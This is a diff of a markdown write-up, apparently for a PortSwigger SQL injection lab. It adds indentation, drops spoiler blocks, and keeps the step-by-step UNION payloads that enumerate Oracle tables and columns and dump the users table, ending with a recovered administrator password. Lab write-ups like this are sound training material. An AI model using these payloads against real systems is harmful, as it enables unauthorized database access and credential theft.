@@ -16,33 +16,27 @@ The application has a login function, and the database contains a table that hol
 
 ## Exp
 1. Determine # of columns
-Payload: `?category=Lifestyle' union select NULL,NULL from dual--`
+    
+    Payload: `?category=Lifestyle' union select NULL,NULL from dual--`
 
 2. Determine which column contained text string
-Payload: `?category=Lifestyle' union select 'a','b'from dual--`
+    Payload: `?category=Lifestyle' union select 'a','b'from dual--`
 
 3. According to [cheat sheet](https://portswigger.net/web-security/sql-injection/examining-the-database)
-We can use `all_tables` to search `table_name`
-For instance: `SELECT * FROM all_tables`
-Payload: `?category=Lifestyle' union select table_name,NULL from all_tables--`
-    :::spoiler Result
+    
+    We can use `all_tables` to search `table_name`
+    For instance: `SELECT * FROM all_tables`
+    Payload: `?category=Lifestyle' union select table_name,NULL from all_tables--`
     ![](https://i.imgur.com/Qbp5dqq.png)
-    :::
 4. Then tried the specific one - `USERS_LXJEEY`
-Payload: `?category=Gifts' union SELECT COLUMN_NAME,NULL FROM all_tab_columns WHERE table_name = 'USERS_LXJEEY'--
-`
-    :::spoiler Result
+    
+    Payload: `?category=Gifts' union SELECT COLUMN_NAME,NULL FROM all_tab_columns WHERE table_name = 'USERS_LXJEEY'--`
     ![](https://i.imgur.com/M1ZoLph.png)
-    :::
 5. Tried dig deeper
-Payload: `?category=Gifts' union SELECT USERNAME_YRYUYR,PASSWORD_OUTVCI FROM USERS_LXJEEY--
-`
-    :::spoiler Result
+    
+    Payload: `?category=Gifts' union SELECT USERNAME_YRYUYR,PASSWORD_OUTVCI FROM USERS_LXJEEY--`
     ![](https://i.imgur.com/sbtaeGi.png)
-    :::
-Finally, we know the password of `administrator` is `z0mtqaim65dnb4yo034l`
-:::spoiler Success Screenshot
-![](https://i.imgur.com/cEOjCoq.png)
-:::
 
-## Reference
+Finally, we know the password of `administrator` is `z0mtqaim65dnb4yo034l`
+
+![](https://i.imgur.com/cEOjCoq.png)
